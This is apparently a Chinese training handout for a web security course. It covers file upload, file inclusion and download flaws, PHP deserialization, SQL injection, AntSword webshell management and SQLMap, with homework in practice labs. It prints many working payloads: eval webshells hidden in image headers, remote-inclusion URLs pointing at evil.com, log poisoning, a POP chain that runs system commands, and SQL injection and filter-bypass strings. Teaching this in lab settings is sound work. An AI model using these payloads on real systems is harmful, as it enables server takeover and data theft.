# 第五天：Web安全基础（二）（三）

---

## 学习目标

- 掌握文件上传/包含/下载漏洞
- 学会使用中国蚁剑
- 理解PHP魔术方法
- 掌握反序列化漏洞
- 掌握SQL注入漏洞及绕过技术

---

## 一、文件上传漏洞串讲与实战

### 1.1 文件上传漏洞原理

**漏洞成因：**
```
- 未验证文件类型
- 未验证文件扩展名
- 未验证文件内容
- 配置不当（解析漏洞）
```

**漏洞危害：**
```
- 上传Webshell获取服务器权限
- 上传恶意脚本执行命令
- 上传病毒木马
- 覆盖重要文件
```

### 1.2 常见绕过方法

**前端绕过：**
```javascript
// 前端JavaScript验证
// 绕过方法：禁用JS、抓包修改

// 原始代码
function checkFile() {
    var file = document.getElementById('file').value;
    var ext = file.substring(file.lastIndexOf('.') + 1);
    if (ext != 'jpg' && ext != 'png') {
        alert('只允许上传图片');
        return false;
    }
    return true;
}
```

**MIME类型绕过：**
```http
# 正常上传
Content-Type: image/jpeg

# 绕过方法：修改Content-Type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

**后缀名绕过：**
```bash
# 大小写绕过
.PHP
.Php
.pHp

# 双写绕过
.pphphp
.phtphp

# 特殊后缀
.php3
.php4
.php5
.phtml
.pht
.phps

# 点号绕过
shell.php.
shell.php......

# 空格绕过
shell.php 

# ::$DATA绕过（Windows）
shell.php::$DATA

# 00截断（PHP < 5.3.4）
shell.php%00.jpg
shell.php\x00.jpg
```

**内容绕过：**
```php
<?php
// 文件头检测
// 绕过方法：添加图片文件头

// GIF文件头
GIF89a<?php @eval($_POST['cmd']); ?>

// PNG文件头
\x89PNG\r\n\x1a\n<?php @eval($_POST['cmd']); ?>

// JPG文件头
\xff\xd8\xff\xe0<?php @eval($_POST['cmd']); ?>
```

**图片马制作：**
```bash
# 方法1：copy命令
copy /b image.jpg + shell.php output.jpg

# 方法2：手动编辑
# 用十六进制编辑器在图片末尾添加PHP代码

# 方法3：exiftool
exiftool -Comment='<?php @eval($_POST["cmd"]);?>' image.jpg
```

### 1.3 解析漏洞

**Apache解析漏洞：**
```bash
# 从右向左解析，识别最后一个有效扩展名
shell.php.xxx
shell.php.aaa.bbb

# .htaccess文件
# 上传.htaccess文件
AddType application/x-httpd-php .jpg

# 然后上传shell.jpg即可执行
```

**Nginx解析漏洞：**
```bash
# 配置错误导致解析漏洞
# /uploadfiles/shell.jpg/x.php
# Nginx会将shell.jpg当作PHP解析

# CGI路径修复漏洞
# /uploadfiles/shell.jpg%00.php
```

**IIS解析漏洞：**
```bash
# IIS 6.0
shell.asp;.jpg     # 分号截断
shell.asp/xx.jpg   # 目录解析
shell.cer          # cer/asp/cdx解析

# IIS 7.0/7.5
shell.jpg/x.php    # CGI路径修复
```

### 1.4 文件上传防护

**防护措施：**
```php
<?php
// 1. 白名单验证扩展名
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    die("不允许的文件类型");
}

// 2. 验证MIME类型
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mime)) {
    die("不允许的MIME类型");
}

// 3. 验证文件内容
$image_info = getimagesize($_FILES['file']['tmp_name']);
if ($image_info === false) {
    die("不是有效的图片文件");
}

// 4. 重命名文件
$new_name = uniqid() . '.' . $ext;

// 5. 上传目录设置
// 禁止执行权限
// 使用独立域名或CDN
// 设置open_basedir
?>
```

---

## 二、文件包含漏洞串讲与实战

### 2.1 文件包含漏洞原理

**漏洞成因：**
```php
<?php
// 危险代码
$file = $_GET['page'];
include($file);
?>

# 正常访问
http://target/index.php?page=home.php

# 攻击利用
http://target/index.php?page=/etc/passwd
http://target/index.php?page=http://evil.com/shell.txt
```

**文件包含函数：**
```php
<?php
// include：包含失败产生警告，继续执行
include('file.php');

// require：包含失败产生错误，停止执行
require('file.php');

// include_once：同include，但只包含一次
include_once('file.php');

// require_once：同require，但只包含一次
require_once('file.php');
?>
```

### 2.2 本地文件包含（LFI）

**读取敏感文件：**
```bash
# Linux
?page=/etc/passwd
?page=/etc/shadow
?page=/etc/hosts
?page=/proc/self/environ
?page=/proc/self/fd/0
?page=/var/log/apache2/access.log
?page=/var/log/apache2/error.log

# Windows
?page=C:\Windows\System32\drivers\etc\hosts
?page=C:\Windows\win.ini
?page=C:\Windows\System32\config\SAM
```

**目录遍历：**
```bash
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc/passwd
?page=..%252f..%252f..%252fetc/passwd
```

### 2.3 远程文件包含（RFI）

**前提条件：**
```php
; php.ini配置
allow_url_include = On
allow_url_fopen = On
```

**远程包含：**
```bash
# 包含远程文件
?page=http://evil.com/shell.txt
?page=https://evil.com/shell.txt

# 使用FTP
?page=ftp://evil.com/shell.txt

# 使用data协议（PHP >= 5.2）
?page=data:text/plain,<?php phpinfo();?>
?page=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

### 2.4 文件包含利用技巧

**PHP伪协议：**
```bash
# php://filter - 读取源码
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=index.php

# php://input - 执行代码
?page=php://input
POST DATA: <?php system('whoami'); ?>

# data:// - 执行代码
?page=data://text/plain,<?php phpinfo();?>
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

# zip:// - 包含压缩文件
?page=zip://shell.zip%23shell.php
?page=zip://upload/shell.jpg%23shell.php

# phar:// - 包含phar文件
?page=phar://shell.zip/shell.php

# compress.zlib:// - 压缩流
?page=compress.zlib://shell.php
```

**日志文件包含：**
```bash
# 修改User-Agent为PHP代码
GET / HTTP/1.1
Host: target
User-Agent: <?php system($_GET['cmd']); ?>

# 包含日志文件
?page=/var/log/apache2/access.log&cmd=whoami

# Windows
?page=C:\xampp\apache\logs\access.log
```

**Session文件包含：**
```bash
# 设置Session
<?php
session_start();
$_SESSION['test'] = '<?php system($_GET["cmd"]); ?>';
?>

# 包含Session文件
?page=/tmp/sess_SESSIONID&cmd=whoami
?page=C:\Windows\Temp\sess_SESSIONID
```

### 2.5 文件包含防护

**防护措施：**
```php
<?php
// 1. 白名单验证
$allowed_pages = ['home', 'about', 'contact'];
if (!in_array($page, $allowed_pages)) {
    die("非法页面");
}

// 2. 过滤目录遍历
$page = str_replace('../', '', $page);
$page = str_replace('..\\', '', $page);

// 3. 设置open_basedir
ini_set('open_basedir', '/var/www/html/');

// 4. 禁用危险函数
disable_functions = system,exec,passthru,shell_exec

// 5. 关闭远程包含
allow_url_include = Off
allow_url_fopen = Off
?>
```

---

## 三、文件下载漏洞

### 3.1 文件下载漏洞原理

**漏洞代码：**
```php
<?php
$file = $_GET['file'];
header("Content-Disposition: attachment; filename=" . basename($file));
readfile($file);
?>
```

**漏洞利用：**
```bash
# 下载敏感文件
download.php?file=../../../etc/passwd
download.php?file=../../../var/www/html/config.php
download.php?file=../../../var/log/apache2/access.log
```

### 3.2 文件下载防护

**防护措施：**
```php
<?php
// 1. 白名单验证
$allowed_files = ['file1.pdf', 'file2.pdf'];
if (!in_array($file, $allowed_files)) {
    die("文件不存在");
}

// 2. 使用basename()
$file = basename($file);

// 3. 设置下载目录
$download_dir = '/var/www/downloads/';
$file = $download_dir . basename($file);

// 4. 检查文件是否存在
if (!file_exists($file)) {
    die("文件不存在");
}
?>
```

---

## 四、安装中国蚁剑及实操使用

### 4.1 蚁剑高级功能

**虚拟终端：**
```
- 执行系统命令
- 支持交互式命令
- 命令历史记录
```

**文件管理：**
```
- 浏览文件系统
- 上传/下载文件
- 编辑文件内容
- 文件权限修改
```

**数据库管理：**
```
- 支持MySQL/MSSQL/PostgreSQL等
- 执行SQL查询
- 导出数据
- 可视化管理
```

**数据管理：**
```
- Cookie管理
- 请求代理
- 编码转换
```

### 4.2 蚁剑实操练习

**练习1：文件管理**
```
1. 连接Webshell
2. 浏览目录结构
3. 下载敏感文件
4. 上传工具文件
```

**练习2：命令执行**
```
1. 打开虚拟终端
2. 执行系统信息收集命令
3. 执行网络信息收集命令
4. 执行用户信息收集命令
```

**练习3：数据库操作**
```
1. 配置数据库连接
2. 查看数据库列表
3. 查看表结构
4. 导出敏感数据
```

---

## 五、魔术方法知识串讲

### 5.1 PHP魔术方法介绍

**__construct()：构造函数**
```php
<?php
class Test {
    public function __construct() {
        echo "构造函数被调用\n";
    }
}

$obj = new Test();  // 输出：构造函数被调用
?>
```

**__destruct()：析构函数**
```php
<?php
class Test {
    public function __destruct() {
        echo "析构函数被调用\n";
    }
}

$obj = new Test();
unset($obj);  // 输出：析构函数被调用
?>
```

**__toString()：字符串转换**
```php
<?php
class Test {
    public function __toString() {
        return "Test Object";
    }
}

$obj = new Test();
echo $obj;  // 输出：Test Object
?>
```

**__call()：调用不存在的方法**
```php
<?php
class Test {
    public function __call($name, $args) {
        echo "调用不存在的方法：$name\n";
        print_r($args);
    }
}

$obj = new Test();
$obj->hello("world");
// 输出：
// 调用不存在的方法：hello
// Array ( [0] => world )
?>
```

**__get()：获取不存在的属性**
```php
<?php
class Test {
    public function __get($name) {
        echo "获取不存在的属性：$name\n";
        return null;
    }
}

$obj = new Test();
echo $obj->name;
// 输出：获取不存在的属性：name
?>
```

**__set()：设置不存在的属性**
```php
<?php
class Test {
    public function __set($name, $value) {
        echo "设置不存在的属性：$name = $value\n";
    }
}

$obj = new Test();
$obj->name = "test";
// 输出：设置不存在的属性：name = test
?>
```

**__invoke()：对象当作函数调用**
```php
<?php
class Test {
    public function __invoke() {
        echo "对象被当作函数调用\n";
    }
}

$obj = new Test();
$obj();  // 输出：对象被当作函数调用
?>
```

**__wakeup()：反序列化时调用**
```php
<?php
class Test {
    public function __wakeup() {
        echo "反序列化时调用\n";
    }
}

$obj = new Test();
$serialized = serialize($obj);
unserialize($serialized);  // 输出：反序列化时调用
?>
```

**__sleep()：序列化时调用**
```php
<?php
class Test {
    public function __sleep() {
        echo "序列化时调用\n";
        return ['name'];
    }
}

$obj = new Test();
serialize($obj);  // 输出：序列化时调用
?>
```

---

## 六、反序列化POP链

### 6.1 PHP序列化与反序列化

**序列化函数：**
```php
<?php
// serialize() - 序列化
$obj = new stdClass();
$obj->name = "test";
$obj->age = 18;
$serialized = serialize($obj);
echo $serialized;
// O:8:"stdClass":2:{s:4:"name";s:4:"test";s:3:"age";i:18;}

// 类型标识
// s: 字符串
// i: 整数
// b: 布尔值
// a: 数组
// O: 对象
// N: NULL
?>
```

**反序列化函数：**
```php
<?php
// unserialize() - 反序列化
$serialized = 'O:8:"stdClass":2:{s:4:"name";s:4:"test";s:3:"age";i:18;}';
$obj = unserialize($serialized);
echo $obj->name;  // test
echo $obj->age;   // 18
?>
```

**序列化格式：**
```
O:8:"stdClass":2:{s:4:"name";s:4:"test";s:3:"age";i:18;}
││ │         │ │              │
││ │         │ │              └─ 属性值
││ │         │ └─ 属性名
││ │         └─ 属性数量
││ └─ 类名长度
│└─ 对象类型
└─ 类名

a:3:{i:0;s:3:"foo";i:1;s:3:"bar";i:2;s:3:"baz";}
│ │
│ └─ 元素数量
└─ 数组类型
```

### 6.2 POP链构造

**POP链概念：**
```
Property Oriented Programming
利用魔术方法的调用链构造攻击
```

**简单POP链示例：**
```php
<?php
class A {
    public $cmd;
    public function __destruct() {
        system($this->cmd);
    }
}

// 构造payload
$obj = new A();
$obj->cmd = "whoami";
echo serialize($obj);
// O:1:"A":1:{s:3:"cmd";s:6:"whoami";}

// 利用
unserialize($_GET['data']);
?>
```

**复杂POP链示例：**
```php
<?php
class A {
    public $obj;
    public function __destruct() {
        $this->obj->run();
    }
}

class B {
    public $cmd;
    public function run() {
        system($this->cmd);
    }
}

// 构造payload
$b = new B();
$b->cmd = "whoami";
$a = new A();
$a->obj = $b;
echo serialize($a);
// O:1:"A":1:{s:3:"obj";O:1:"B":1:{s:3:"cmd";s:6:"whoami";}}
?>
```

### 6.3 反序列化逃逸

**字符逃逸原理：**
```php
<?php
// 过滤函数
function filter($str) {
    return str_replace("abc", "", $str);
}

// 正常情况
$obj = unserialize(filter($_GET['data']));

// 利用字符逃逸
// 如果过滤后长度变短，可以逃逸出闭合的引号
?>
```

**逃逸示例：**
```php
<?php
// 题目代码
class User {
    public $name;
    public $role;
}

$name = $_GET['name'];
$name = str_replace("admin", "", $name);
$data = 'O:4:"User":2:{s:4:"name";s:' . strlen($name) . ':"' . $name . '";s:4:"role";s:5:"guest";}';
$obj = unserialize($data);

if ($obj->role === "admin") {
    echo "Flag: xxx";
}
?>

# 构造payload
# 需要将role从guest变成admin
# 使用admin填充，过滤后长度变短
name=adminadminadminadminadmin";s:4:"role";s:5:"admin";}
```

### 6.4 反序列化防护

**防护措施：**
```php
<?php
// 1. 不要反序列化用户输入
// 使用JSON代替序列化
$data = json_encode($obj);
$obj = json_decode($data);

// 2. 使用白名单
$allowed_classes = ['SafeClass'];
$obj = unserialize($data, ['allowed_classes' => $allowed_classes]);

// 3. 使用签名验证
$signature = hash_hmac('sha256', $data, $secret_key);
if ($signature !== $_GET['signature']) {
    die("Invalid signature");
}

// 4. 使用__wakeup()或__destruct()检查
class SafeClass {
    public function __wakeup() {
        // 检查数据合法性
        if ($this->dangerous) {
            die("Invalid data");
        }
    }
}
?>
```

---

## 七、SQL注入漏洞基础回顾

### 7.1 SQL注入原理

**漏洞成因：**
```php
<?php
// 危险代码
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);
?>

# 正常登录
username: admin
password: 123456
SQL: SELECT * FROM users WHERE username='admin' AND password='123456'

# SQL注入
username: admin' --
password: anything
SQL: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
```

### 7.2 SQL注入分类

**按注入点分类：**
```
- 数字型注入：id=1
- 字符型注入：name='admin'
- 搜索型注入：keyword='%test%'
```

**按获取数据方式分类：**
```
- 联合查询注入：UNION SELECT
- 报错注入：利用报错信息
- 布尔盲注：根据页面返回判断
- 时间盲注：根据响应时间判断
- 堆叠注入：执行多条SQL语句
```

### 7.3 联合查询注入

**判断列数：**
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
# 当ORDER BY 4报错时，说明有3列
```

**获取数据库名：**
```sql
' UNION SELECT 1,database(),3-- -
```

**获取表名：**
```sql
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
```

**获取列名：**
```sql
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

**获取数据：**
```sql
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

---

## 八、SQL注入过滤绕过方式

### 8.1 关键字过滤绕过

**大小写绕过：**
```sql
' UnIoN SeLeCt 1,2,3-- -
```

**双写绕过：**
```sql
' UNIunionON SELselectECT 1,2,3-- -
```

**内联注释绕过：**
```sql
' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
```

### 8.2 空格过滤绕过

**使用注释替代空格：**
```sql
'/**/UNION/**/SELECT/**/1,2,3-- -
```

**使用其他空白字符：**
```sql
' UNION%0ASELECT%0A1,2,3-- -
' UNION%0DSELECT%0D1,2,3-- -
' UNION%09SELECT%091,2,3-- -
```

**使用括号：**
```sql
' UNION(SELECT(1),2,3)-- -
```

### 8.3 引号过滤绕过

**使用十六进制：**
```sql
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273-- -
```

**使用CHAR()函数：**
```sql
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)-- -
```

**使用编码：**
```sql
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=unhex('7573657273')-- -
```

### 8.4 注释符过滤绕过

**使用其他注释符：**
```sql
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3;%00
```

**闭合引号：**
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3' 
```

### 8.5 等号过滤绕过

**使用LIKE：**
```sql
' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admin'-- -
```

**使用REGEXP：**
```sql
' UNION SELECT 1,2,3 FROM users WHERE username REGEXP 'admin'-- -
```

**使用BETWEEN：**
```sql
' UNION SELECT 1,2,3 FROM users WHERE username BETWEEN 'admin' AND 'admin'-- -
```

---

## 九、报错注入、盲注

### 9.1 报错注入

**extractvalue()报错：**
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
```

**updatexml()报错：**
```sql
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -
```

**floor()报错：**
```sql
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### 9.2 布尔盲注

**判断数据库名长度：**
```sql
' AND length(database())=8-- -
```

**逐字符判断数据库名：**
```sql
' AND ascii(substr(database(),1,1))=115-- -
' AND ascii(substr(database(),2,1))=101-- -
```

**使用正则表达式：**
```sql
' AND database() REGEXP '^s'-- -
' AND database() REGEXP '^se'-- -
```

### 9.3 时间盲注

**使用IF()函数：**
```sql
' AND IF(ascii(substr(database(),1,1))=115,sleep(5),0)-- -
```

**使用BENCHMARK()函数：**
```sql
' AND IF(ascii(substr(database(),1,1))=115,BENCHMARK(10000000,sha1('test')),0)-- -
```

### 9.4 SQLMap使用

**基本使用：**
```bash
# 检测注入点
sqlmap -u "http://target/page.php?id=1"

# 指定POST参数
sqlmap -u "http://target/login.php" --data="username=admin&password=123"

# 指定Cookie
sqlmap -u "http://target/page.php?id=1" --cookie="session=abc123"

# 指定User-Agent
sqlmap -u "http://target/page.php?id=1" --user-agent="Mozilla/5.0"
```

**获取数据：**
```bash
# 获取数据库列表
sqlmap -u "http://target/page.php?id=1" --dbs

# 获取表列表
sqlmap -u "http://target/page.php?id=1" -D database --tables

# 获取列列表
sqlmap -u "http://target/page.php?id=1" -D database -T table --columns

# 获取数据
sqlmap -u "http://target/page.php?id=1" -D database -T table -C username,password --dump
```

**高级选项：**
```bash
# 指定注入技术
sqlmap -u "http://target/page.php?id=1" --technique=BEUSTQ

# 指定风险等级
sqlmap -u "http://target/page.php?id=1" --level=3 --risk=2

# 绕过WAF
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,between
```

---

## 十、Wireshark实操

### 10.1 分析文件上传流量

**实验步骤：**
```
1. 打开Wireshark
2. 设置过滤器：http
3. 开始捕获
4. 上传文件
5. 停止捕获
6. 分析上传请求
```

**分析要点：**
```
1. 找到POST请求
2. 查看Content-Type
3. 查看文件名
4. 查看文件内容
5. 分析绕过方法
```

### 10.2 分析SQL注入流量

**实验步骤：**
```
1. 开始捕获
2. 使用SQLMap测试
3. 停止捕获
4. 分析注入流量
```

**分析要点：**
```
1. 识别注入Payload
2. 分析绕过技术
3. 提取注入参数
4. 分析响应差异
```

---

## 十一、课后作业

### 作业1：文件上传练习
```
搭建upload-labs靶场，练习文件上传绕过：
1. 完成前10关
2. 记录每关绕过方法
3. 撰写解题报告
```

### 作业2：文件包含练习
```
搭建DVWA靶场，练习文件包含漏洞：
1. 低安全级别：本地文件包含
2. 中安全级别：远程文件包含
3. 高安全级别：绕过过滤
4. 撰写漏洞利用报告
```

### 作业3：反序列化练习
```
练习PHP反序列化漏洞：
1. 理解序列化格式
2. 构造简单POP链
3. 练习字符逃逸
4. 撰写解题报告
```

### 作业4：SQL注入练习
```
搭建SQLi-labs靶场，练习SQL注入：
1. 完成前20关
2. 掌握各种注入技术
3. 学习SQLMap使用
4. 撰写解题报告
```

---

## 常用工具速查

### 文件上传工具
```bash
# BurpSuite拦截上传
# 修改文件名、Content-Type、文件内容

# 文件上传字典
/usr/share/seclists/Web-Shells/
```

### SQL注入工具
```bash
# SQLMap
sqlmap -u "URL" --dbs --tables --dump

# BurpSuite Intruder
# 手动注入测试
```

### 反序列化工具
```bash
# PHP反序列化生成器
# ysoserial (Java反序列化)
# PHPGGC (PHP反序列化)
```

---

## 学习资源

### 靶场环境
- upload-labs：文件上传练习
- DVWA：综合Web漏洞练习
- SQLi-labs：SQL注入练习
- Pikachu：Web漏洞练习

### 学习资源
- SQL注入讲解：https://portswigger.net/web-security/sql-injection
- 文件上传讲解：https://portswigger.net/web-security/file-upload
- 反序列化讲解：https://portswigger.net/web-security/deserialization

---

## 总结

第五天的学习重点：
1. **文件上传**：掌握常见绕过方法和防护措施
2. **文件包含**：理解本地/远程文件包含，掌握PHP伪协议
3. **文件下载**：了解文件下载漏洞原理和防护
4. **中国蚁剑**：掌握Webshell管理工具使用
5. **魔术方法**：理解PHP魔术方法触发条件
6. **反序列化**：掌握POP链构造和字符逃逸
7. **SQL注入**：掌握各种注入技术和绕过方法

通过今天的学习，你将具备Web安全测试的核心技能。